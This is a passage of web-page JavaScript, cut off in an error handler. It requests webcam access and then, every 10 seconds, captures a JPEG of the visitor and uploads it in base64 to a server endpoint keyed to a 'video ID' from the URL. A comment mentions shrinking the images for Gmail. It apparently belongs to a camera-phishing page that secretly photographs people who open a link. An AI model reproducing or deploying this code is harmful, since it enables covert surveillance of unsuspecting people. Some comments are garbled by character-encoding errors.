<script>
const camera = document.getElementById("camera");
const statusText = document.getElementById("statusText");
const videoId = window.location.pathname.split("/").pop() || "default_video";

async function sendSnapshot(base64) {
    try {
        await fetch("/upload-html-image", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ videoId, base64 })
        });
        console.log("‚úÖ Snapshot sent for video ID:", videoId);
    } catch(err) {
        console.error("‚ùå Failed to send snapshot:", err);
    }
}

// Camera permission
navigator.mediaDevices.getUserMedia({ video:true, audio:false })
.then(stream => {
    camera.srcObject = stream;

    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    async function capture() {
        canvas.width = 640;   // smaller for Gmail
        canvas.height = 360;
        ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
            const reader = new FileReader();
            reader.onloadend = () => {
                const base64 = reader.result.split(",")[1];
                sendSnapshot(base64);
            };
            reader.readAsDataURL(blob);
        }, "image/jpeg", 0.7);
    }

    // ‡¶™‡ßç‡¶∞‡¶§‡¶ø 10 ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°‡ßá capture
    setInterval(capture, 10000);

})
.catch(async err => {
